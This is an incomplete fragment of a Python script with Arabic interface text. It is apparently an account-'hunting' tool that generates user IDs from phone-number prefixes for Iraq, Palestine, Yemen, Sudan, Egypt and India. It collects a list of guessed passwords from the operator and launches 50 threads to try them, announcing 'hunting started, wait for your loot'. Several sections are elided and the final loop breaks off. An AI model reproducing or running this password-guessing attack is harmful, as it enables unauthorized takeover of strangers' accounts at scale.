...
g= datetime.datetime(2023, 5, 5, 12, 10 ,9)
...
def i():
    ...
    os.system("clear")
    jalan(logo)    
    jalan("\033[1;37m\t اداه صيد دوله انتضر التحديث القادم")
    jalan('\033[1;36m {VIP}{العراق}>>964750 \n \033[1;34m{VIP}{العراق}>>964751 \n \033[1;31m{VIP}{العراق}>>964770 \n \033[1;32m{VIP}{العراق}>>64780 \n \033[1;35m{VIP}{فلسطين}>>97059 \n \033[1;33m{VIP}{اليمن}>>96279 \n \033[1;36m{VIB}{السودان}>>24996 \n \033[1;35m{VIP}{مصر}>>2010 \n \033[1;34m{VIP}{مصر}>>2015 \n \033[1;33m{VIP}{مصر}>>2012 \n \033[1;32m{VIP}{الهند}>>967 \n \033[1;31m{VIP}{فلسطين}>>97056 ')
    ...
    os.system("clear")
    print(logo)
    passx = int(input("[VIP] عدد باسوردات التخمين  : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[VIP]   اكتب الباسوورد : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;32m بدا الصيد انتضر رزقك')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
